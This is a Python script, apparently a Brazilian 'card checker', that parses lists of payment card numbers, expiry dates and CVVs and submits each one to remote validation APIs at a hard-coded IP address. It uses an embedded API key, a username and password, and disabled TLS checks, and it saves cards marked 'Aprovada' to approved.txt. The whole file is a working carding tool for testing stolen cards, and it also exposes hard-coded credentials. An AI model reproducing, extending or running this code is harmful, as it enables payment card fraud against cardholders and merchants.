import re
from abc import ABC, abstractmethod
from pathlib import Path

import requests
import urllib3
from rich.console import Console
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Card:
    def __init__(self, number: str, month: str, year: str, cvv: str):
        self.number = number
        self.month = month.zfill(2)
        self.year = year[-2:]
        self.cvv = cvv

    def format(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"


class CardParser:
    PATTERN = re.compile(r"(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})")

    def parse(self, filepath: str) -> list[Card]:
        content = Path(filepath).read_text(encoding="utf-8")
        return [Card(*m.groups()) for m in self.PATTERN.finditer(content)]


class ResponseParser(ABC):
    @abstractmethod
    def parse(self, response: requests.Response) -> str:
        pass


class JsonResponseParser(ResponseParser):
    def parse(self, response: requests.Response) -> str:
        try:
            return response.json().get("status", "UNKNOWN")
        except (ValueError, KeyError):
            return self._fallback_parse(response.text)

    def _fallback_parse(self, text: str) -> str:
        if "badge-success" in text or "Aprovada" in text:
            return "Aprovada"
        elif "badge-danger" in text or "Reprovada" in text:
            return "Reprovada"
        return "UNKNOWN"


class ResultLogger:
    def __init__(self, console: Console):
        self.console = console
        self.approved = self._load_existing("approved.txt")
        self.declined = []
        self.errors = []

    def _load_existing(self, filepath: str) -> list[str]:
        path = Path(filepath)
        if path.exists():
            return path.read_text(encoding="utf-8").strip().split("\n")
        return []

    def log(self, card: Card, status: str):
        line = f"{card.format()} - {status}"

        if "timeout" in status.lower() or "error" in status.lower():
            self.errors.append(line)
            self.console.print(f"[yellow]![/yellow] {line}")
        elif "aprovada" in status.lower():
            self.approved.append(line)
            self.console.print(f"[green]OK[/green] {line}")
            self._save_approved()
        else:
            self.declined.append(line)
            self.console.print(f"[red]FAIL[/red] {line}")

    def _save_approved(self):
        if self.approved:
            Path("approved.txt").write_text("\n".join(self.approved), encoding="utf-8")

    def save(self):
        if self.approved:
            Path("approved.txt").write_text("\n".join(self.approved), encoding="utf-8")
        if self.declined:
            Path("declined.txt").write_text("\n".join(self.declined), encoding="utf-8")

    def stats(self) -> Table:
        table = Table(title="Results")
        table.add_column("Status", style="cyan")
        table.add_column("Count", justify="right", style="magenta")
        table.add_row("Approved", str(len(self.approved)), style="green")
        table.add_row("Declined", str(len(self.declined)), style="red")
        table.add_row("Errors", str(len(self.errors)), style="yellow")
        table.add_row(
            "Total",
            str(len(self.approved) + len(self.declined) + len(self.errors)),
            style="bold",
        )
        return table


class ApiClient:
    def __init__(
        self, url: str, api_key: str, session: requests.Session, parser: ResponseParser
    ):
        self.url = url
        self.api_key = api_key
        self.session = session
        self.parser = parser
        self.console = Console()

    def check(self, card: Card, retries: int = 3) -> str:
        for attempt in range(retries):
            try:
                response = self.session.get(
                    self.url,
                    params={"apikey": self.api_key, "lista": card.format()},
                    timeout=60,
                    verify=False,
                )
                return self.parser.parse(response)
            except requests.Timeout:
                if attempt < retries - 1:
                    self.console.print(
                        f"[yellow]Retry {attempt + 1}/{retries}[/yellow] {card.format()}"
                    )
                    continue
                return "TIMEOUT"
            except Exception as e:
                return f"ERROR: {str(e)}"
        return "TIMEOUT"


class AuthenticatedApiClient(ApiClient):
    def __init__(
        self,
        url: str,
        api_key: str,
        session: requests.Session,
        parser: ResponseParser,
        login_url: str,
        credentials: dict,
    ):
        super().__init__(url, api_key, session, parser)
        self.login_url = login_url
        self.credentials = credentials
        self._authenticate()

    def _authenticate(self):
        try:
            self.console.print("[cyan]Authenticating...[/cyan]")
            response = self.session.post(
                self.login_url,
                data=self.credentials,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                timeout=30,
                verify=False,
            )
            if response.status_code == 200:
                self.console.print("[green]Authenticated successfully[/green]")
            else:
                self.console.print(
                    f"[red]Authentication failed: {response.status_code}[/red]"
                )
        except Exception as e:
            self.console.print(f"[red]Authentication error: {e}[/red]")


class CardChecker:
    def __init__(self, client: ApiClient, parser: CardParser, logger: ResultLogger):
        self.client = client
        self.parser = parser
        self.logger = logger
        self.console = Console()

    def run(self, filepath: str):
        cards = self.parser.parse(filepath)

        if not cards:
            self.console.print("[red]No cards found[/red]")
            return

        self.console.print(f"[cyan]Checking {len(cards)} cards...[/cyan]\n")

        for card in cards:
            status = self.client.check(card)
            self.logger.log(card, status)

        self.console.print("\n")
        self.console.print(self.logger.stats())
        self.console.print("\n")
        self.logger.save()
        self.console.print("[green]Results saved[/green]")


class ApiFactory:
    @staticmethod
    def create_erede() -> ApiClient:
        session = requests.Session()
        parser = JsonResponseParser()
        return ApiClient(
            url="http://56.124.89.232/erede/api_auth.php",
            api_key="51652f80df7ba78c2abe55dc1b56330a3542a37b96d8b1c3765828e05483abd4",
            session=session,
            parser=parser,
        )

    @staticmethod
    def create_zerodolar() -> AuthenticatedApiClient:
        session = requests.Session()
        parser = JsonResponseParser()
        return AuthenticatedApiClient(
            url="http://56.124.89.232/auth/api.php",
            api_key="51652f80df7ba78c2abe55dc1b56330a3542a37b96d8b1c3765828e05483abd4",
            session=session,
            parser=parser,
            login_url="http://56.124.89.232/valida.php",
            credentials={
                "token": "11966848948256",
                "usuario": "tiagks7",
                "senha": "12132829Aa@",
            },
        )


def main():
    console = Console()

    console.print("\n[bold cyan]Select API:[/bold cyan]")
    console.print("[yellow]1[/yellow] - E-Rede")
    console.print("[yellow]2[/yellow] - Zero-Dolar")

    choice = input("\nSelect: ").strip()

    if choice == "1":
        client = ApiFactory.create_erede()
    elif choice == "2":
        client = ApiFactory.create_zerodolar()
    else:
        console.print("[red]Invalid selection[/red]")
        return

    parser = CardParser()
    logger = ResultLogger(console)
    checker = CardChecker(client, parser, logger)
    checker.run("lista.txt")


if __name__ == "__main__":
    main()
